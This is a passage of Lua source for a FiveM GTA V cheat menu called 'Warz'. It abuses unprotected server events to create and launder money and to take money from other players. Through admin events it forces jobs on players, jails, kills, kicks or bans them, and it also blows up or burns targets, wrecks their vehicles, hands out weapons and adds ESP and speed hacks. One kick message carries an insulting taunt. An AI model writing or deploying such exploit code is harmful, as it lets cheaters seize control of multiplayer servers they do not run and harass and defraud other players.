					TriggerServerEvent('esx_blanchisseur:washMoney', 5000)
					TriggerServerEvent('esx_blanchisseur:washMoney', 5000)
					TriggerServerEvent('esx_blanchisseur:washMoney', 5000)
				elseif Warz.Button("Arrête Tout ~c~(Drugs)") then
					TriggerServerEvent('esx_drugs:stopHarvestCoke')
					TriggerServerEvent('esx_drugs:stopTransformCoke')
					TriggerServerEvent('esx_drugs:stopSellCoke')
					TriggerServerEvent('esx_drugs:stopHarvestMeth')
					TriggerServerEvent('esx_drugs:stopTransformMeth')
					TriggerServerEvent('esx_drugs:stopSellMeth')
					TriggerServerEvent('esx_drugs:stopHarvestWeed')
					TriggerServerEvent('esx_drugs:stopTransformWeed')
					TriggerServerEvent('esx_drugs:stopSellWeed')
					TriggerServerEvent('esx_drugs:stopHarvestOpium')
					TriggerServerEvent('esx_drugs:stopTransformOpium')
					TriggerServerEvent('esx_drugs:stopSellOpium')
					drawNotification("~p~Tout est maintenant arrêté.")
				elseif Warz.CheckBox("~p~ Spam Drugs",
					BlowDrugsUp,
					function(enabled)
						BlowDrugsUp = enabled
					end)
				then
				end

				
				Warz.Display()
			elseif Warz.IsMenuOpened("RecrutePlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Warz.MenuButton("~h~~p~-»  ~s~"..GetPlayerName(i).."", 'RecrutePlayersOptions2') then
						SelectedPlayer = i
					end
				end
				
				Warz.Display()
			elseif Warz.IsMenuOpened("RecrutePlayersOptions2") then
				Warz.SetSubTitle("RecrutePlayersOptions2", "Recrute Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if Warz.Button("Recruit Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
				TriggerServerEvent('esx:recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif Warz.Button("Recruit Police") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif Warz.Button("Recruit Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif Warz.Button("Recruit Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif Warz.Button("Recruit Ambulance") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif Warz.Button("Custom Recruit") then
					local reason = KeyboardInput("Enter the job name", "", 100)
					local reason2 = KeyboardInput("Enter the nivel job number 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), reason, reason2)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Warz.MenuButton("~h~~p~-»  ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~p~DEAD~s~]" or "~s~[~g~ALIVE~s~]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
		

				Warz.Display()
			elseif Warz.IsMenuOpened("PlayerOptionsMenu") then
				Warz.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~p~[" .. GetPlayerName(SelectedPlayer) .. "~p~]")
				if Warz.Button("Regarder", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif Warz.Button("esx_spectate/kick") then
					TriggerEvent('esx_spectate:spectate')
				elseif Warz.Button("Téléportation Au Joueur") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
				elseif Warz.Button("Sell LowEndApartment (Must be RealEstate)") then
					TriggerServerEvent('esx_realestateagentjob:sell', GetPlayerServerId(SelectedPlayer), 'LowEndApartment', 1)
				elseif Warz.Button("Sell CustomProperty (Must be RealEstate)") then
					local result = KeyboardInput("Enter name of property", "", 100000000)
					if result then
					TriggerServerEvent('esx_realestateagentjob:sell', GetPlayerServerId(SelectedPlayer), result, 1)
					end
				elseif Warz.Button("Ouvrir L'inventaire Du Joueur") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
				elseif Warz.Button("Donner De L'argent") then
						local result = KeyboardInput("Entrez Le montant D'argent to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif Warz.Button("~g~Donner De La Vie") then
					TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(SelectedPlayer), 'big')
				elseif Warz.Button("~p~Retirer De L'argent") then
						local result = KeyboardInput("Entrez Le montant D'argent to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
				elseif Warz.Button("~p~Exploser") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				elseif Warz.Button("~g~Réanimer Le Joueur") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
				elseif Warz.Button("~g~Réanimer Le Joueur ~o~2") then
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
				elseif Warz.Button("~g~Réanimer Le Joueur ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif Warz.Button("Donner Une ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif Warz.Button("~h~~p~Tuer ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif Warz.Button('Bruler') then
				    FirePlayer(SelectedPlayer)
					elseif Warz.Button("Prison") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
				elseif Warz.Button("Libre") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))	
				elseif Warz.Button("~g~Donner Toutes Les Armes") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif Warz.MenuButton("Menu D'armes", "SingleWepPlayer") then
				elseif Warz.Button("Apparaître Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Entre Vehicle Spawn Name", "", 100)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~p~Le Modèle N'est Pas Valide!")
					end
				elseif Warz.Button("Cuff ~g~ESX") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
					elseif Warz.Button("~h~~b~--Vehicle Options--") then
				elseif Warz.Button("~b~Virer Du Véhicule") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif Warz.Button("~b~Détruire Véhicule ~p~NEW") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
 
				elseif Warz.Button("~b~Réparer Le Véhicule ~p~NEW") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
 
				elseif Warz.Button("Niquer La Voiture ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "Warz")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("Vehicle Niquer ;D")
				elseif Warz.Button("TP Sur Moi") then
					TriggerServerEvent( 'mellotrainer:s_adminTp', GetPlayerServerId(SelectedPlayer))
				elseif Warz.Button("KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif Warz.Button("BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif Warz.Button("KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "YOU GAY" )
				elseif Warz.Button("Donner Une Licence D`arme") then
					TriggerServerEvent('esx_license:addLicense', GetPlayerServerId(SelectedPlayer), 'weapon2')
					TriggerServerEvent('esx_license:addLicense', GetPlayerServerId(SelectedPlayer), 'weapon')
				elseif Warz.Button("Avoir Le PPA") then
					local result = KeyboardInput("Type of PPA", "", 100000000)
					local result2 = KeyboardInput("Price", "", 100000000)
					if result and result2 then
					TriggerServerEvent('esx_ammujob:buyPPA', GetPlayerServerId(SelectedPlayer), result, result2)
					end
				elseif Warz.Button("Supprimer La Licence D'arme") then				
					TriggerServerEvent('esx_license:removeLicense', GetPlayerServerId(SelectedPlayer), 'weapon')
					TriggerServerEvent('esx_license:removeLicense', GetPlayerServerId(SelectedPlayer), 'weapon2')
					end	
				
			
			
			
				Warz.Display()
            elseif Warz.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if Warz.MenuButton('~h~~p~#~s~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if Warz.MenuButton(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('WeaponOptions') then
                if Warz.Button('Apparaître Une Arme') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if Warz.Button('Ajouter Des Munitions') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                end
                for e0, ev in pairs(dz.mods) do
                    if Warz.MenuButton('~h~~p~#~s~ ~h~~p~> ~s~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if Warz.Button(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if Warz.MenuButton('~h~~p~#~s~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if Warz.MenuButton('~h~~p~#~s~ ~h~~p~>~s~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('CarOptions') then
                if Warz.Button('Apparaître Un Véhicule') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~p~Impossible De Faire Apparaître Ce Véhicule.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if Warz.Button(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('ESPMenu') then
                if
                    Warz.CheckBox(
                        '~p~ESP ~s~MasterSwitch',
                        esp,
                        function(dR)
                            esp = dR
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~p~ESP ~s~Box',
                        espbox,
                        function(dR)
                            espbox = dR
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~p~ESP ~s~Info',
                        espinfo,
                        function(dR)
                            espinfo = dR
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~p~ESP ~s~Lignes',
                        esplines,
                        function(dR)
                            esplines = dR
                        end
                    )
                 then
                end
                Warz.Display()
            elseif Warz.IsMenuOpened('BoostMenu') then
                if
                    Warz.ComboBox(
                        '~p~Booster ~s~x1',
                        dD,
                        dB,
                        dC,
                        function(ag, ah)
                            dB = ag
                            dC = ah
                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0)
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~g~Booster ~s~x2',
                        t2x,
                        function(dR)
                            t2x = dR
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~g~Booster ~s~x4',
                        t4x,
                        function(dR)
                            t2x = false
                            t4x = dR
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~h~Engine ~g~Booster ~s~x10',
                        t10x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = dR
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~g~Booster ~s~x16',
                        t16x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = dR
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~g~Booster ~s~x30',
                        txd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = dR
                            tbxd = false
                        end
                    )
                 then
                elseif
                    Warz.CheckBox(
                        '~g~Booster ~s~Max',
                        tbxd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = dR
                        end
                    )
                 then
                end
				Warz.Display()
            elseif Warz.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Warz.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                    end
                end

				Warz.Display()
			elseif IsDisabledControlPressed(0, 208) then
				if azezaezeazdqsdqs then
                   Warz.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Entre Mot De Passe Et Te Trompe Pas ", "", 100)
                    if temp == dEI then
                        drawNotification("~g~~h~Bien Joué, Vous Venez De Vous Connecter!")
                        azezaezeazdqsdqs = true
						Warz.OpenMenu("MainMenu")
                    else
                        drawNotification("~r~~p~La Connexion A Echoué?")
                    end
                end
				
			end

			Citizen.Wait(0)
		end
	end
)

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
